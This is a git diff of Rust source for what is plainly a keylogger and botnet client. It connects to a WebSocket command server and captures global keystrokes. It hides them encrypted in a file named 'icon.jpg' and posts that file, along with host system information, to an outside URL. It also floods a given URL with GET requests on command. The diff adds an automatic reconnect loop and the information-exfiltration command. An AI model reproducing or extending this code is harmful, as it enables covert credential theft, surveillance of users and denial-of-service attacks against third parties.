@@ -1,6 +1,6 @@
 #![allow(non_snake_case,non_camel_case_types,dead_code)]
 
-use std::{fs::{self, File}, io::Write, process::Command, sync::{Mutex, Arc},};
+use std::{fs::{self, File}, io::Write, process::Command, sync::Mutex};
 use rdev::{EventType, Key, SimulateError, Button, simulate, listen};
 use aes_gcm::{
     aead::{Aead, KeyInit},
@@ -22,7 +22,7 @@ enum CMD{
     ATT(String,u16),
 }
 impl From<&str> for CMD{
-    fn from(s: &str) -> Self {
+    fn from(s: &str) -> Self { 
         match s{
             "INFO"=>CMD::INFO,
             "KEYLOG"=>CMD::KEYLOG,
@@ -52,13 +52,8 @@ impl ToString for CMD{
 struct CommandJson{
     cmd:String,
 }
-impl ToString for CommandJson{
-    fn to_string(&self) -> String {
-        self.to_string()
-    }
-}
 
-#[derive(Deserialize)]
+#[derive(Debug,Deserialize)]
 struct AttJson{
     cmd:String,
     ip:String,
@@ -68,126 +63,161 @@ struct AttJson{
 static EVENT:Mutex<String> =Mutex::new(String::new());
 #[tokio::main]
 async fn main() {
-    
-    // let output = if cfg!(target_os = "windows") { 
-    //     Command::new("powershell")
-    //         .args(["echo "," a"])
-    //         .output()
-    //         .expect("Failed to execute command")
-    //     } else {
-    //         Command::new("sh")
-    //         .arg("-c")
-    //         .arg("echo hello")
-    //         .output()
-    //         .expect("failed to execute process")
-    //     };
-    //     println!("{}",String::from_utf8_lossy(output.stdout.as_slice()).to_string());
-    
-    let (cmd_sender,mut cmd_receiver) =channel::<CMD>(1);
-    let (mut socket, response) =
-    connect(Url::parse("ws://127.0.0.1:8080/ws").unwrap()).expect("Can't connect");
-
-    println!("Connected to the server");
-    println!("Response HTTP code: {}", response.status());
-    println!("Response contains the following headers:");
-    for (ref header, _value) in response.headers() {
-        println!("* {}", header);
-    }
-
-    // socket.write_message(Message::Text("Hello WebSocket".into())).unwrap();
-    let ws_sender = cmd_sender.clone();
-    tokio::spawn(async move{
-        loop{
-            let msg = socket.read_message().expect("Error reading message");
-            let cmd_json:CommandJson = serde_json::from_str(msg.to_string().as_str()).unwrap();
-            let ws_cmd = CMD::from(cmd_json.cmd.as_str());
-            println!("ws cmd : {}",ws_cmd.to_string());
-            *EVENT.lock().unwrap() = ws_cmd.to_string().clone();
-            ws_sender.send(ws_cmd).await.unwrap();
+    loop{
+        if online::check(Some(1)).is_ok(){
+            // let output = if cfg!(target_os = "windows") { 
+            //     Command::new("powershell")
+            //         .args(["echo "," a"])
+            //         .output()
+            //         .expect("Failed to execute command")
+            //     } else {
+            //         Command::new("sh")
+            //         .arg("-c")
+            //         .arg("echo hello")
+            //         .output()
+            //         .expect("failed to execute process")
+            //     };
+            //     println!("{}",String::from_utf8_lossy(output.stdout.as_slice()).to_string());
             
-            std::thread::sleep(std::time::Duration::from_secs(2));
-        }
-    });
-    let mut words = Box::new(Vec::<String>::new());
-    while let Some(cmd) = cmd_receiver.recv().await{
-        println!("COMMAND {}",cmd.to_string() ); 
-        match cmd{
-            CMD::KEYLOG=>{
-                let (key_sender,mut key_receiver) = tokio::sync::mpsc::unbounded_channel::<String>();
-                let mut word = String::new();
-                let thr_input = tokio::spawn(async move{
-                    save_keyboard_input(key_sender).await.unwrap();
-                });
-                while let Some(data) = key_receiver.recv().await{
-                    let event = EVENT.lock().unwrap().clone();
-                    if event != cmd.to_string(){
-                        std::mem::drop(key_receiver);
-                        std::mem::drop(thr_input);
-                        std::mem::drop(word);
+            let (cmd_sender,mut cmd_receiver) =channel::<CMD>(1);
+            let (mut socket, response);
+            loop{
+                match connect(Url::parse("ws://127.0.0.1:8080/ws").unwrap()){
+                    Ok(w)=>{
+                        (socket,response) = (w.0,w.1);
                         break;
+                    },
+                    Err(_)=>{
+                        std::thread::sleep(std::time::Duration::from_secs(120));
                     }
-                    if data == "Enter"{
-                        if !word.is_empty(){
-                            words.push(word.clone());
-                            word.clear();
-                        }
-                    }else{
-                        word.push_str(data.as_str());
+                };
+            }
+        
+            for (ref header, _value) in response.headers() {
+                println!("* {}", header);
+            }
+        
+            socket.write_message(Message::Text("Hello WebSocket".into())).unwrap();
+            let tx_sender = cmd_sender.clone();
+            let ws_sender = cmd_sender.clone();
+            tokio::spawn(async move{
+                loop{
+                    let msg = socket.read_message().expect("Error reading message");
+                    let cmd_json:CommandJson = serde_json::from_str(msg.to_string().as_str()).unwrap();
+                    let ws_cmd = CMD::from(cmd_json.cmd.as_str());
+                    println!("ws cmd : {}",ws_cmd.to_string());
+                    *EVENT.lock().unwrap() = ws_cmd.to_string().clone();
+                    if ws_cmd.to_string() == "ATT"{
+                        let cmd_json:AttJson = serde_json::from_str(msg.to_string().as_str()).unwrap();
+                        ws_sender.send(CMD::ATT(cmd_json.ip,cmd_json.times)).await.unwrap();
                     }
-                }
-            },
-            CMD::SLEEP=>{
-                println!("SLEEP MODE");
-            },
-            CMD::C_ICON=>{
-                let file = create_icon_file();
-                if file.is_err(){
-                    set_readonly(false).unwrap();
-                    fs::remove_file("./icon.jpg").unwrap();
-                }
-                let data = encrypt(*words.clone());
-                let result = file.unwrap().write_all(&data[..]);
-                if result.is_err(){
-                    ws_sender.send(CMD::C_ICON).await.unwrap();
+                    ws_sender.send(ws_cmd).await.unwrap();
+
                     std::thread::sleep(std::time::Duration::from_secs(2));
                 }
-                words.clear();
-                set_readonly(true).unwrap();
-            },
-            CMD::SEND=>{
-                let file = fs::read("./icon.jpg").unwrap();
-                let client = reqwest::Client::new();
-                // test url 
-                // http://httpbin.org/post
-                let res = client
-                .post("http://httpbin.org/post")
-                .body(file)
-                .send()
-                .await;
-                if res.is_err(){
-                    println!("Error {:?}",res.err());
-                    std::mem::drop(client);
+            });
+            let mut words = Box::new(Vec::<String>::new());
+            while let Some(cmd) = cmd_receiver.recv().await{
+                println!("COMMAND {}",cmd.to_string() ); 
+                match cmd{
+                    CMD::KEYLOG=>{
+                        let (key_sender,mut key_receiver) = tokio::sync::mpsc::unbounded_channel::<String>();
+                        let mut word = String::new();
+                        let thr_input = tokio::spawn(async move{
+                            save_keyboard_input(key_sender).await.unwrap();
+                        });
+                        while let Some(data) = key_receiver.recv().await{
+                            let event = EVENT.lock().unwrap().clone();
+                            if event != cmd.to_string(){
+                                std::mem::drop(key_receiver);
+                                std::mem::drop(thr_input);
+                                std::mem::drop(word);
+                                break;
+                            }
+                            if data == "Enter"{
+                                if !word.is_empty(){
+                                    words.push(word.clone());
+                                    word.clear();
+                                }
+                            }else{
+                                word.push_str(data.as_str());
+                            }
+                        }
+                    },
+                    CMD::SLEEP=>{
+                        println!("SLEEP MODE");
+                    },
+                    CMD::C_ICON=>{
+                        let file = create_icon_file();
+                        if file.is_err(){
+                            set_readonly(false).unwrap();
+                            fs::remove_file("./icon.jpg").unwrap();
+                        }
+                        let data = encrypt(*words.clone());
+                        let result = file.unwrap().write_all(&data[..]);
+                        if result.is_err(){
+                            tx_sender.send(CMD::C_ICON).await.unwrap();
+                            std::thread::sleep(std::time::Duration::from_secs(2));
+                        }
+                        words.clear();
+                        set_readonly(true).unwrap();
+                        tx_sender.send(CMD::SLEEP).await.unwrap();
+                    },
+                    CMD::R_ICON=>{
+                        set_readonly(false).unwrap();
+                        fs::remove_file("./icon.jpg").unwrap();
+                        tx_sender.send(CMD::SLEEP).await.unwrap();
+                    }
+                    CMD::SEND=>{
+                        let file = fs::read("./icon.jpg").unwrap();
+                        let client = reqwest::Client::new();
+                        // test url 
+                        // http://httpbin.org/post
+                        let res = client
+                        .post("http://httpbin.org/post")
+                        .body(file)
+                        .send()
+                        .await;
+                        if res.is_err(){
+                            std::mem::drop(client);
+                        }
+                        set_readonly(false).unwrap();
+                        fs::remove_file("./icon.jpg").unwrap();
+                        tx_sender.send(CMD::SLEEP).await.unwrap();
+                    }
+                    CMD::ATT(url,times)=>{
+                        for _ in 0..times{
+                            let client = reqwest::Client::new();
+                            match client
+                            .get(url.clone())
+                            .send()
+                            .await{
+                                Ok(_)=>(),
+                                Err(_)=>(),    
+                            };
+                        }
+                        tx_sender.send(CMD::SLEEP).await.unwrap();
+                    }
+                    CMD::INFO=>{
+                        let information = get_information();
+                        let client = reqwest::Client::new();
+                        let res = client
+                        .post("http://httpbin.org/post")
+                        .json(&information)
+                        .send()
+                        .await;
+                        if res.is_err(){
+                            std::mem::drop(client);
+                        }
+                        tx_sender.send(CMD::SLEEP).await.unwrap();
+                    }
                 }
-                set_readonly(false).unwrap();
-                fs::remove_file("./icon.jpg").unwrap();
-                std::thread::sleep(std::time::Duration::from_secs(1));
             }
-            CMD::ATT(url,times)=>{
-                for _ in 0..times{
-                    let client = reqwest::Client::new();
-                    match client
-                    .get(url.clone())
-                    .send()
-                    .await{
-                        Ok(_)=>(),
-                        Err(_)=>(),    
-                    };
-                }
-            }
-            _ =>{}
         }
+        std::thread::sleep(std::time::Duration::from_secs(120));
     }
 }
+
 
 
 fn encrypt(text:Vec<String>)->Vec<u8>{
@@ -278,6 +308,7 @@ fn get_env(key:&str)->String{
     i.unwrap()
     
 }
+#[derive(Serialize,Deserialize)]
 struct EnvInformation{
     os:String,
     number_of_processors:String,
